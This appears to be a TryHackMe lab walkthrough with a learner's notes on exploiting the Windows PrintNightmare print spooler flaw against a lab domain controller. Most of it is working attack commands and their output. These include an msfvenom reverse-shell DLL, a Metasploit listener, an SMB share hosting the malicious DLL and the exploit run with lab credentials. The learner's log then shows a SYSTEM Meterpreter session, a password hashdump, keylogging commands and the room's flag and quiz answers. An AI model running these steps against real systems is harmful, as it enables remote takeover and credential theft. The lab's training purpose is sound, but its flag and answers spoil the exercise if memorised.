---
Learn about the vulnerability known as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527).
---

![](https://assets.tryhackme.com/additional/printnightmare/pm-room-banner1.png)

![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/01c0ff183a9d9767f90b03ca14b9a24d.png)

###  Introduction 

This room will cover the Printnightmare vulnerability from a offensive and defensive perspective.

Per Microsoft, "A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights".

Learning Objectives: In this room, you will learn what PrintNightmare vulnerability is, how to exploit and mitigate it. You will also learn the detection mechanisms using Windows Event Logs and Wireshark. 

Outcome: As a result, you will be ready to defend your organization against any potential PrintNightmare attacks. 

Learning Pre-requisites: You should be familiar with Wireshark, Windows Event Logs, Linux Fundamentals, and Meterpreter prior to joining this room. 

### Windows Print Spooler Service 

![](https://i.ibb.co/GM5RPFc/printspool.png)

Microsoft defines the [Print spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) as a service that runs on each computer system. As you can guess from the name, the Print spooler service manages the printing processes. The Print spooler's responsibilities are managing the print jobs, receiving files to be printed, queueing them, and scheduling.

You are able to Start/Stop/Pause/Resume the Print Spooler Service by simply navigating to Services on your Windows system. 

Services:

![](https://i.ibb.co/RT53ySK/spooleerr.png)

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/b1e6690e-453a-4415-9506-2706ba31feac#gt_12a6e569-e97c-4761-92f0-e397f8d5125f

print spooler: The component is a service that implements the Print Services system on Windows-based print clients and print servers. The spooler buffers and orders print jobs and converts print job data to printer-specific formats.

Print Spooler Properties (Services):

![](https://i.ibb.co/3WPvSJY/print.png)


Print spooler service makes sure to provide enough resources to the computers that send out the print jobs. Remember the early days when users had to wait for print jobs to finish to perform other operations? Well, the Print spooler service took care of this issue for us. 

The Print spooler service allows the systems to act as print clients, administrative clients, or print servers. It is also important to note that the Print spooler service is enabled by default in all Windows clients and servers. It's necessary to have a Print spooler service on the computer to connect to a printer. There are third-party software and drivers provided by the printer manufacturers that would not require you to have the Print spooler service enabled. Still, most companies prefer to utilize Print spooler services. 

Domain Controllers mainly use Print spooler service for printer pruning (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory). Printer pruning eliminates the issue for the users reaching out to a non-existent printer.  You will know soon why we mentioned Domain Controllers. 


Where would you enable or disable Print Spooler Service?
*Services*

### Remote Code Execution Vulnerability 

![|222](https://i.ibb.co/n66nMM9/tuxpi-com-1629004074.jpg)

To better understand the PrintNightmare vulnerability (or any vulnerability), you should get into the habit of researching the vulnerabilities by reading Microsoft articles on any Windows-specific CVE or browsing through the Internet for community and vendor blogposts.

There has been some confusion if the [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) and [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) are related to each other. They go under the same name: Windows Print Spooler Remote Code Execution Vulnerability and are both related to the Print Spooler. 

As Microsoft states in the FAQ, the PrintNightmare (CVE-2021-34527) vulnerability "is similar but distinct from the vulnerability that is assigned CVE-2021-1675. The attack vector is different as well."

What did Microsoft mean by the attack vector? To answer this question, let's look into the differences between the two vulnerabilities and append the timeline of events. 

Per Microsoft's definition, PrintNightmare vulnerability is "a remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.".

Running arbitrary code involves executing any commands of the attacker's choice and preference on a victim's machine.
Suppose you had a chance to look at both CVE's on Microsoft. You would notice that the attack vectors for both are different. 

To exploit the CVE-2021-1675 vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the CVE-2021-34527 vulnerability successfully, the attacker can remotely inject the malicious DLL file. 

Vulnerability metrics for CVE-2021-1675:

```
PS C:\Users\User> Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler

```

![](https://i.ibb.co/fd1m86s/spooleerr1.png)

Vulnerability metrics for CVE-2021-34527:

![](https://i.ibb.co/tKZMCXB/34527.png)

Timeline:

June 8, 2021: Microsoft issued a patch for a privilege escalation vulnerability in the print spooler service (CVE-2021-1675).

June 21, 2021: Microsoft revised the vulnerability and changed its classification to remote code execution (RCE).

June 27, 2021: Chinese cybersecurity firm [QiAnXin](https://ti.qianxin.com/) published a [video](https://twitter.com/RedDrip7/status/1409353110187757575) demonstrating local privilege escalation (LPE) and RCE.

July 2, 2021: Microsoft assigns a new CVE so-called PrintNightmare vulnerability in the print spooler service (CVE-2021-34527).

July 6, 2021: Microsoft released an out-of-band patch (a patch released at some time other than the normal release time) to address CVE-2021-34527 and provides additional workarounds to defend against the exploit.

What makes PrintNightmare dangerous? 

    It can be exploited over the network; the attacker doesn't need direct access to the machine.
    The proof-of-concept was made public on the Internet. https://github.com/cube0x0/CVE-2021-1675
    The Print Spooler service is enabled by DEFAULT on domain controllers and computers with SYSTEM privileges.


Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine.
*CVE-2021-34527*

https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/view#gid=1190662839

What date was the CVE assigned for the vulnerability in the previous question? (mm/dd/yyyy)
*07/02/2021*

### Try it yourself! 

To understand how the attack works and what logs and events are generated, you need to put the Black Hat on and run the attack on your own. But, of course, it requires permission from management to perform this attack in your employer's environment, even if it's an isolated environment.

Fret not, you can perform the attack against the attached virtual machine and not in your employer's environment. 

Start the attached virtual machine. After a few minutes, your machine's IP should be: 10.10.118.174 

Follow the steps outlined below to exploit the Domain Controller using the Attack Box by exploiting the PrintNightmare vulnerability. 

In the sample terminal output below, the victim is 192.168.0.200, and the attacker is 192.168.0.100. 

Note: As a subscriber, launch the Attack Box if you haven't done so before proceeding. As a free user, this task should be completed on your local attacking machine. As a free user, you can skip these uninstall steps and jump to installing the Impacket and the exploit.

First, let's clean up the Attack Box before downloading the necessary components for the PrintNightmare exploit. 

This is necessary because some pre-installed components in the Attack Box will prevent the successful execution of the exploit.

Uninstall Impacket:

```

Uninstall Impacket

           
root@attackbox:~# pip uninstall impacket
Found existing installation: impacket 0.9.21
Uninstalling impacket-0.9.21:
  Would remove:
	[...]
Proceed (y/n)? y
  Successfully uninstalled impacket-0.9.21

        
```

Uninstall pyasn1:

```

Uninstall pyasn1

           
root@attackbox:~# pip uninstall pyasn1
Found existing installation: pyasn1 0.4.2
Uninstalling pyasn1-0.4.2:
  Would remove:
    /usr/lib/python3/dist-packages/pyasn1
    /usr/lib/python3/dist-packages/pyasn1-0.4.2.egg-info
Proceed (y/n)? y
  Successfully uninstalled pyasn1-0.4.2

        
```

Re-install pyasn1 (version > 0.4.2):

```

Re-install pyasn1

           
root@attackbox:~# pip install pyasn1
Collecting pyasn1
  Downloading pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)
Installing collected packages: pyasn1
Successfully installed pyasn1-0.4.8

        


```

Now you should be ready to download the [exploit](https://github.com/tryhackme/CVE-2021-1675) and [Impacket](https://github.com/tryhackme/impacket) to the Attack Box from the TryHackMe GitHub repo.

Before proceeding, create 2 directories on the Desktop:

    pn - this will contain the exploit and impacket. 
    share - this directory (/root/Desktop/share) will contain the malicious DLL that will be created with msfvenom. 

Download CVE-2021-1675.py:

```
Clone CVE-2021-1675 exploit from GitHub

root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/CVE-2021-1675.git 
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 173, done.
remote: Counting objects: 100% (173/173), done.
remote: Compressing objects: 100% (105/105), done.
remote: Total 173 (delta 62), reused 133 (delta 36), pack-reused 0
Receiving objects: 100% (173/173), 1.45 MiB | 452.00 KiB/s, done.
Resolving deltas: 100% (62/62), done.
```

Download & install Impacket:

```
Clone Impacket from GitHub

root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/impacket.git 
Cloning into 'impacket'...
remote: Enumerating objects: 19570, done.
remote: Total 19570 (delta 0), reused 0 (delta 0), pack-reused 19570
Receiving objects: 100% (19570/19570), 6.57 MiB | 8.88 MiB/s, done.
Resolving deltas: 100% (14896/14896), done.
```

Next, navigate to the impacket directory and install Impacket.

```
Install Impacket

root@attackbox:~/Desktop/pn/impacket# python setup.py install 
... 
Finished processing dependencies for impacket==0.9.24.dev1+20210704.162046.29ad5792
```

If you see a similar message to the one above, then you're golden. Before spinning up Metasploit, create the malicious DLL. 

Note: In the terminal outputs below the victim is 192.168.0.200 and the attacker is 192.168.0.100.  You will need to replace 192.168.0.100 with your ATTACK BOX IP (or OpenVPN IP) and 192.168.0.200 with the victim 10.10.118.174.

You will use msfvenom to create the malicious DLL. 

```
Create malicious DLL with Msfvenom

root@attackbox:~/Desktop/pn# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 5120 bytes
Saved as: /root/Desktop/share/malicious.dll
```

If you see a similar output when you run this command, then you should have successfully created the DLL.

Let's fire up Metasploit.

```
Launch Metasploit

root@attackbox:~/Desktop/pn# msfconsole 
=[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 >
```

Once Metasploit successfully loads, you need to configure the handler to receive the incoming connection from the malicious DLL. 

Run the following commands options:

    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost VALUE 
    set lport VALUE

Note: The value for LHOST and LPORT must be the same values you used to create the malicious DLL. 

```
Configure a Metasploit listener

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.100
lhost => 192.168.0.100 msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) >
```

Next, run it so it will be actively waiting for a connection. 

```
Start the listener to accept incoming connections

msf5 exploit(multi/handler) > run -j 
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP on 192.168.0.100:4444
```

The -j simply means to run it as a job. 

```
Check the Metasploit Job status

msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.0.100:4444

msf5 exploit(multi/handler) >


```
Great, now you'll need to host the malicious DLL in a SMB share running on the attacker box. We'll use the AttackBox in this example.

Below is how to do this with smbserver.py from Impacket.

```
Start the SMB share with Impacket to host the malicious DLL

root@attackbox:~/Desktop/pn# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

A brief explanation for the command in the above image:

    This is the name of the SMB share for the exploit execution. (Example: \\ATTACKER_IP\share\malicious.dll)
    This is the local folder that will store the malicious DLL. (Example: /root/Desktop/share/malicious.dll)

Before we blindly just execute an exploit at the target, let's first examine if the target fits the criteria to exploit it.

```
Check if the target is vulnerable to this exploit

root@attackbox:~/Desktop/pn# rpcdump.py @10.10.118.174 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be /root/Desktop/pn/CVE-2021-1675. 

We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.

```
Check if the target is vulnerable to this exploit

root@attackbox:~/Desktop/pn# rpcdump.py @10.10.118.174 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-RPRN]: Print System Remote Protocol 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

Yep, looks good. It's finally time to run the exploit. Navigate to the location where you downloaded the exploit code from GitHub, which should be /root/Desktop/pn/CVE-2021-1675. 

We will use the Python script to exploit the PrintNightmare vulnerability against the Windows 2019 Domain Controller.

```
Exploit code syntax

root@attackbox:~/Desktop/pn/CVE-2021-1675# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.118.174 '\\192.168.0.100\share\malicious.dll'
```

A brief explanation for the command in the above image:

    python CVE-2021-1675.py -> you're instructing Python to run the following Python script. The values which follow are the parameters the script needs to exploit the PrintNightmare vulnerability successfully.
    Finance-01.THMdepartment.local -> the name of the domain controller (Finance-01) along with the name of the domain (THMdepartment.local)
    sjohnston:mindheartbeauty76@10.10.118.174 -> the username and password for the low privilege Windows user account. 
    \\ATTACKER_IP_ADDRESS\share\malicious.dll -> the location to the SMB path storing the malicious DLL. 

If all goes well, you should see an output similar to the below image.

```
Run the exploit

root@attackbox:~/Desktop/pn/CVE-2021-1675# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.118.174 '\\192.168.0.100\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.118.174[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.0.100\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
[*] Stage0: 0
```

You may see Python errors after Try 3... but they are safe to ignore.

On the attacker box, you should see the SMB connection calling for the malicious DLL file.

```
Victim connects to the SMB share for the malicious DLL

root@attackbox:~/Desktop/pn# ...
[*] Incoming connection (10.10.118.174,55037)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.210.90,55037)
[*] Remaining connections []
```

Lastly, you will have a successful Meterpreter session. 

```
Incoming connection received

msf5 exploit(multi/handler) > [*] Sending stage (201283 bytes) to 10.10.118.174 [*] Meterpreter session 1 opened (192.168.0.100:4444 -> MACHINE_IP:55038) at 2021-08-17 17:56:31 +0100
```

![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de58e2bfac4a912bcc7a3e9/room-content/54ca28f6a4af72beeb9855a69cb4816a.png)

```
┌──(root㉿kali)-[~/Desktop/pn/CVE-2021-1675]
└─# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.150.198 '\\10.13.0.182\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.150.198[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.13.0.182\share\malicious.dll
[*] Try 1...
Traceback (most recent call last):
  File "/root/Desktop/pn/CVE-2021-1675/CVE-2021-1675.py", line 188, in <module>
    main(dce, pDriverPath, options.share)
  File "/root/Desktop/pn/CVE-2021-1675/CVE-2021-1675.py", line 93, in main
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rprn.py", line 633, in hRpcAddPrinterDriverEx
    return dce.request(request)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 878, in request
    raise exception
impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.

giv me some error 


now works for me, iptables was denying traffic

┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
└─# rpcdump.py @10.10.66.59 | egrep 'MS-RPRN|MS-PAR' 
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 


┌──(root㉿kali)-[~/home/witty/Desktop/CVE-2021-1675]
└─# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.66.59 '\\10.8.19.103\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.66.59[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.8.19.103\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smbconnection.py", line 568, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3.py", line 1650, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3.py", line 1358, in write
    if ans.isValidAnswer(STATUS_SUCCESS):
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smb3structs.py", line 454, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/home/witty/Desktop/CVE-2021-1675/CVE-2021-1675.py", line 192, in <module>
    main(dce, pDriverPath, options.share)
  File "/root/home/witty/Desktop/CVE-2021-1675/CVE-2021-1675.py", line 93, in main
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rprn.py", line 633, in hRpcAddPrinterDriverEx
    return dce.request(request)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 856, in request
    self.call(request.opnum, request, uuid)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 845, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 1298, in send
    self._transport_send(data)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/rpcrt.py", line 1235, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/dcerpc/v5/transport.py", line 535, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
  File "/usr/local/lib/python3.10/dist-packages/impacket-0.9.24.dev1+20210704.162046.29ad5792-py3.10.egg/impacket/smbconnection.py", line 570, in writeFile
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)

┌──(root㉿kali)-[~/home/witty/Desktop/impacket]
└─# smbserver.py share /root/Desktop/share/ -smb2support 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.66.59,58277)
[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)
[*] User FINANCE-01\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.10.66.59,58277)
[*] Remaining connections []

┌──(root㉿kali)-[~]
└─# ls
bettercap.history  Desktop  home  wittyAle
                                                                                                             
┌──(root㉿kali)-[~]
└─# msfconsole                
                                                  

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v6.2.25-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.8.19.103
lhost => 10.8.19.103
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.19.103:4444 
msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://10.8.19.103:4444

msf6 exploit(multi/handler) > 
[*] Sending stage (200774 bytes) to 10.10.66.59
[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.66.59:58280) at 2022-11-15 16:06:34 -0500

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ FINANCE-01  10.8.19.103:4444 -> 10.10.66.59:5828
                                                                       0 (10.10.66.59)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter > search -f flag.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\flag.txt  23            2021-08-13 10:40:20 -0400

meterpreter > cat 'c:\Users\Administrator\Desktop\flag.txt'
THM{SiGBQPMkSvejvmQNEL}

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hostname
[-] Unknown command: hostname
meterpreter > sysinfo
Computer        : FINANCE-01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : THMDEPARTMENT
Logged On Users : 7
Meterpreter     : x64/windows

meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:001a5b3e266374c0df96a298f7f7419f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f8b2337852443abbf18a807b1052bb77:::
sjohnston:1000:aad3b435b51404eeaad3b435b51404ee:9b06562a2168a1f094aa0d9aae222793:::
FINANCE-01$:1001:aad3b435b51404eeaad3b435b51404ee:016aa3670d0974f6d5642a01ecd77825:::

meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station  Name
    -------  -------  ----
    0        WinSta0  Default
    0        WinSta0  Disconnect
    0        WinSta0  Winlogon

meterpreter > idletime
User has been idle for: 1 hour 12 mins 28 secs

meterpreter > keyboard_send hi
[*] Done
meterpreter > keyevent 13 press
[*] Done

meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_stop
